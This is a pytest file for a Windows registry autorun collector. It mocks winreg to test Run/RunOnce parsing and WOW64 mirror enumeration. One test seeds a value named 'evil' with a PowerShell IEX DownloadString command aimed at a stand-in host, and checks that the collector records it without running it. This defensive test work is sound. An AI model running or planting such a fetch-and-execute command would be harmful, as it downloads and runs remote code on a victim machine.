"""Registry collector: parsing + WOW64 enumeration behaviour (mocked)."""

from __future__ import annotations

import types

import pytest

import app.collectors.registry as registry_mod
from app.models.enums import CollectionStatus
from tests.conftest import make_entry


class _FakeKey:
    def __init__(self, values: list[tuple[str, str, int]]):
        self._values = values
        self._idx = 0

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def EnumValue(self, index: int):
        if index >= len(self._values):
            raise OSError("no more values")
        name, data, typ = self._values[index]
        return name, data, typ


class _FakeRegistry:
    """Deterministic stand-in for winreg."""

    HKEY_CURRENT_USER = "HKCU"
    HKEY_LOCAL_MACHINE = "HKLM"
    KEY_READ = 0x20019
    KEY_WOW64_64KEY = 0x0100
    REG_SZ = 1
    REG_EXPAND_SZ = 2

    def __init__(self, data: dict):
        self.data = data  # {(root, subkey, access): _FakeKey}

    def OpenKey(self, root, subkey, reserved=0, access=0):
        data_key = self.data.get((root, subkey))
        if data_key is None:
            raise FileNotFoundError(subkey)
        return data_key

    def EnumValue(self, hkey, index):
        return hkey.EnumValue(index)


REF = {
    "run": r"Software\Microsoft\Windows\CurrentVersion\Run",
    "runonce": r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
}


@pytest.fixture
def registry_data():
    return {
        ("HKCU", REF["run"]): ("//authored", "hkcu_run", "ignored"),
    }


def test_category_for():
    assert registry_mod._category_for(REF["run"]) == "Run"
    assert registry_mod._category_for(REF["runonce"]) == "RunOnce"


def test_item_to_entry_keeps_evidence():
    from app.models.models import RunItem
    item = RunItem(command=r'"C:\x\y.exe" -z', hive="HKCU",
                   key_path=REF["run"], value_name="runme", architecture="64-bit",
                   category="Run")
    entry = registry_mod._item_to_entry(item)
    assert entry.source == "Registry"
    assert entry.hive == "HKCU"
    assert entry.key_path == REF["run"]
    assert entry.value_name == "runme"
    assert entry.architecture == "64-bit"
    assert entry.category == "Run"
    assert any("Value: runme" in ev for ev in entry.evidence_raw)
    assert entry.raw_data["command"] == item.command


def test_collect_plain(monkeypatch):
    fake = _FakeRegistry({
        ("HKCU", REF["run"]): _FakeKey([("updater", r"C:\u\updater.exe", _FakeRegistry.REG_SZ)]),
        ("HKCU", REF["runonce"]): _FakeKey([]),
        ("HKLM", REF["run"]): _FakeKey([("srv", r"C:\windows\srv.exe", _FakeRegistry.REG_SZ)]),
        ("HKLM", REF["runonce"]): _FakeKey([("once", r"reg.exe add x", _FakeRegistry.REG_EXPAND_SZ)]),
    })
    monkeypatch.setattr(registry_mod, "winreg", fake)
    monkeypatch.setattr(registry_mod, "_is_wow64", lambda: False)

    entries, status, meta = registry_mod.collect()
    assert status is CollectionStatus.COMPLETE
    assert len(entries) == 3
    names = {e.value_name for e in entries}
    assert names == {"updater", "srv", "once"}
    assert all(e.architecture == "64-bit" for e in entries)


def test_collect_wow64_mirror(monkeypatch):
    mirror = r"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    fake = _FakeRegistry({
        ("HKLM", REF["run"]): _FakeKey([("native", r"C:\native\a.exe", _FakeRegistry.REG_SZ)]),
        ("HKLM", mirror): _FakeKey([("wow32", r"C:\wow\b.exe", _FakeRegistry.REG_SZ)]),
        ("HKCU", REF["run"]): _FakeKey([]),
        ("HKCU", REF["runonce"]): _FakeKey([]),
        ("HKLM", REF["runonce"]): _FakeKey([]),
    })
    monkeypatch.setattr(registry_mod, "winreg", fake)
    monkeypatch.setattr(registry_mod, "_is_wow64", lambda: True)

    entries, _, _ = registry_mod.collect()
    by_name = {e.value_name: e for e in entries}
    assert "native" in by_name
    assert "wow32" in by_name
    assert by_name["native"].architecture == "64-bit"
    assert by_name["wow32"].architecture == "32-bit"
    assert by_name["wow32"].key_path == mirror


def test_collect_missing_registry_graceful(monkeypatch):
    fake = _FakeRegistry({})
    monkeypatch.setattr(registry_mod, "winreg", fake)
    monkeypatch.setattr(registry_mod, "_is_wow64", lambda: False)
    entries, status, _ = registry_mod.collect()
    assert entries == []
    assert status is CollectionStatus.COMPLETE  # nothing read, nothing failed hard


def test_collect_never_executes(monkeypatch):
    """Values are strings. Ensure the collector stores them verbatim."""
    fake = _FakeRegistry({
        ("HKCU", REF["run"]): _FakeKey(
            [("evil", r'powershell -enc IEX (DownloadString("http://x/y"))',
              _FakeRegistry.REG_SZ)]),
        ("HKCU", REF["runonce"]): _FakeKey([]),
        ("HKLM", REF["run"]): _FakeKey([]),
        ("HKLM", REF["runonce"]): _FakeKey([]),
    })
    monkeypatch.setattr(registry_mod, "winreg", fake)
    monkeypatch.setattr(registry_mod, "_is_wow64", lambda: False)
    entries, _, _ = registry_mod.collect()
    assert len(entries) == 1
    assert "DownloadString" in entries[0].command
    assert entries[0].name == "evil"